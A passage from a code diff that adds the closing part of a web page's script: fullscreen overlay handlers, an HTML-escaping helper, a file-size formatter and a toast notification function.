+  document.getElementById('fsOv').classList.add('open');
+  document.addEventListener('keydown', fsEsc);
+}
+function fsClose() {
+  document.getElementById('fsOv').classList.remove('open');
+  document.removeEventListener('keydown', fsEsc);
+}
+function fsEsc(e) { if (e.key === 'Escape') fsClose(); }
+function fsNative() {
+  const el = document.getElementById('fsOv');
+  if (el.requestFullscreen) el.requestFullscreen();
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+}
+
+// ── Helpers ──────────────────────────────────────────────────────────────────
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function fmtSize(b) {
+  if (!b) return '0 B';
+  if (b < 1024) return b + ' B';
+  if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
+  return (b/1048576).toFixed(1) + ' MB';
+}
+let _toastTimer;
+function toast(msg) {
+  const el = document.getElementById('toast');
+  el.textContent = msg; el.classList.add('show');
+  clearTimeout(_toastTimer);
+  _toastTimer = setTimeout(() => el.classList.remove('show'), 2000);
+}
+
+init();
+</script>
+</body>
+</html>
